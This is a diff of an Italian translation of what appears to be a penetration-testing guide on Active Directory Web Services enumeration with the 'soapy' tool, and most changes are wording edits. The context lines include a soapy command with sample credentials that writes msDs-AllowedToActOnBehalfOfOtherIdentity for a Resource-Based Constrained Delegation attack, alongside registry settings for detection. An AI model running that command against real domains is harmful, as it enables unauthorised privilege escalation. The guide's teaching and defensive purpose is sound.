@@ -26,7 +26,7 @@ Poiché il traffico è incapsulato all'interno di questi frame SOAP binari e via
 * Filtri di ricerca a grana fine identici a LDAP `-q '(objectClass=user)'`.
 * Operazioni di **scrittura** opzionali ( `--set` / `--delete` ).
 * Modalità di output **BOFHound** per l'ingestione diretta in BloodHound.
-* Flag `--parse` per abbellire i timestamp / `userAccountControl` quando è necessaria la leggibilità umana.
+* Flag `--parse` per rendere più leggibili i timestamp / `userAccountControl` quando è necessaria la leggibilità umana.
 
 ### Installazione (host operatore)
 ```bash
@@ -64,13 +64,13 @@ soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
 --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
 msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
 ```
-Combina questo con `s4u2proxy`/`Rubeus /getticket` per una completa **Resource-Based Constrained Delegation** chain.
+Combina questo con `s4u2proxy`/`Rubeus /getticket` per una completa **Delegazione Constrainata Basata su Risorse**.
 
 ## Rilevamento e Indurimento
 
-### Logging Verboso di ADDS
+### Registrazione Verbose di ADDS
 
-Abilita le seguenti chiavi di registro sui Domain Controllers per evidenziare ricerche costose / inefficienti provenienti da ADWS (e LDAP):
+Abilita le seguenti chiavi di registro sui Controller di Dominio per evidenziare ricerche costose / inefficienti provenienti da ADWS (e LDAP):
 ```powershell
 New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
 New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
